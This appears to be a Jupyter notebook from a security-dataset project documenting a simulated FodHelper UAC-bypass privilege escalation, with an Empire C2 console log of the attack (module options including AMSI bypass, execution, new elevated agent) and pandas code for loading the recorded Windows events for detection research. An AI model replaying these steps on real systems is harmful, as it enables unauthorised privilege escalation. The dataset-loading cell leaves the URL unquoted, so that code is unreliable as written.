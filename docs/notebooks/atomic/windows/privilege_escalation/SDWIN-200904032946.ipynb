{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "3d42ac04",
   "metadata": {},
   "source": [
    "# Invoke BypassUAC FodHelper"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f1c271de",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bc0533aa",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2020/09/04 |\n",
    "| Modification Date | 2020/09/04 |\n",
    "| Tactics           | [TA0004](https://attack.mitre.org/tactics/TA0004) |\n",
    "| Techniques        | [T1548.002](https://attack.mitre.org/techniques/T1548/002) |\n",
    "| Tags              | BypassUAC,Registry Modification,Windows Registry FodHelper |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "722f86f7",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries elevating privileges (bypassing uac) by performing an registry modification for FodHelper."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "59f66399",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "22938898",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/privilege_escalation/host/empire_uac_shellapi_fodhelper.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/privilege_escalation/host/empire_uac_shellapi_fodhelper.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7163ce3b",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "baee8557",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a6c944a9",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Empire | [bypassuac_fodhelper](https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/privesc/Invoke-FodHelperBypass.ps1) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "42d782c2",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: SP7B3U2X) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "KU86XWEL ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         5376   5/0.0    2020-09-04 07:07:17  http            \n",
    "SP7B3U2X ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         1376   5/0.0    2020-09-04 07:12:15  http            \n",
    "\n",
    "(Empire: agents) > interact SP7B3U2X\n",
    "(Empire: SP7B3U2X) > \n",
    "(Empire: SP7B3U2X) > usemodule privesc/bypassuac_fodhelper\n",
    "(Empire: powershell/privesc/bypassuac_fodhelper) > info\n",
    "\n",
    "              Name: Invoke-FodHelperBypass\n",
    "            Module: powershell/privesc/bypassuac_fodhelper\n",
    "        NeedsAdmin: False\n",
    "        OpsecSafe: False\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: True\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  Petr Medonos\n",
    "\n",
    "Description:\n",
    "  Bypasses UAC by performing an registry modification for\n",
    "  FodHelper (based\n",
    "  onhttps://winscripting.blog/2017/05/12/first-entry-welcome-\n",
    "  and-uac-bypass/)\n",
    "\n",
    "Comments:\n",
    "  https://winscripting.blog/2017/05/12/first-entry-welcome-\n",
    "  and-uac-bypass/\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name             Required    Value                     Description\n",
    "  ----             --------    -------                   -----------\n",
    "  Agent            True        SP7B3U2X                  Agent to run module on.                 \n",
    "  Listener         True                                  Listener to use.                        \n",
    "  Obfuscate        False       False                     Switch. Obfuscate the launcher          \n",
    "                                                        powershell code, uses the               \n",
    "                                                        ObfuscateCommand for obfuscation types. \n",
    "                                                        For powershell only.                    \n",
    "  ObfuscateCommand False       Token\\All\\1               The Invoke-Obfuscation command to use.  \n",
    "                                                        Only used if Obfuscate switch is True.  \n",
    "                                                        For powershell only.                    \n",
    "  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in \n",
    "                                                        the stager code.                        \n",
    "  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   \n",
    "                                                        the stager code.                        \n",
    "  UserAgent        False       default                   User-agent string to use for the staging\n",
    "                                                        request (default, none, or other).      \n",
    "  Proxy            False       default                   Proxy to use for request (default, none,\n",
    "                                                        or other).                              \n",
    "  ProxyCreds       False       default                   Proxy credentials                       \n",
    "                                                        ([domain\\]username:password) to use for \n",
    "                                                        request (default, none, or other).      \n",
    "\n",
    "(Empire: powershell/privesc/bypassuac_fodhelper) > set Listener http\n",
    "(Empire: powershell/privesc/bypassuac_fodhelper) > execute\n",
    "[>] Module is not opsec safe, run? [y/N] y\n",
    "[*] Tasked SP7B3U2X to run TASK_CMD_JOB\n",
    "[*] Agent SP7B3U2X tasked with task ID 2\n",
    "[*] Tasked agent SP7B3U2X to run module powershell/privesc/bypassuac_fodhelper\n",
    "(Empire: powershell/privesc/bypassuac_fodhelper) > \n",
    "Job started: EHNK23\n",
    "\n",
    "[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5\n",
    "[*] New agent F2X6GE4R checked in\n",
    "[+] Initial agent F2X6GE4R from 172.18.39.5 now active (Slack)\n",
    "[*] Sending agent (stage 2) to F2X6GE4R at 172.18.39.5\n",
    "\n",
    "(Empire: powershell/privesc/bypassuac_fodhelper) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "KU86XWEL ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         5376   5/0.0    2020-09-04 07:07:17  http            \n",
    "SP7B3U2X ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         1376   5/0.0    2020-09-04 07:30:33  http            \n",
    "F2X6GE4R ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         3936   5/0.0    2020-09-04 07:30:34  http            \n",
    "\n",
    "\n",
    "(Empire: agents) > interact F2X6GE4R\n",
    "(Empire: F2X6GE4R) > shell whoami\n",
    "[*] Tasked F2X6GE4R to run TASK_SHELL\n",
    "[*] Agent F2X6GE4R tasked with task ID 1\n",
    "(Empire: F2X6GE4R) > \n",
    "theshire\\pgustavo\n",
    "..Command execution\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dc6ec325",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "378a0354",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "93b0f945",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/privilege_escalation/host/empire_uac_shellapi_fodhelper.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c04dc12c",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5e7c8dc3",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e2b7b087",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7d948a30",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1d123a16",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
